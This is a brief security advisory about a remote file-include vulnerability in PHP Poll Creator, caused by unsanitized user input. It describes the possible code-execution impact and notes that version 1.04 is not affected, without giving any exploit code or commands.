PHP Poll Creator is affected by a remote file-include vulnerability because the application fails to properly sanitize user-supplied input.

An attacker may leverage this issue to execute arbitrary server-side script code on an affected computer with the privileges of the webserver process. This may facilitate unauthorized access.

UPDATE: Further information shows that this issue does not affect version 1.04.
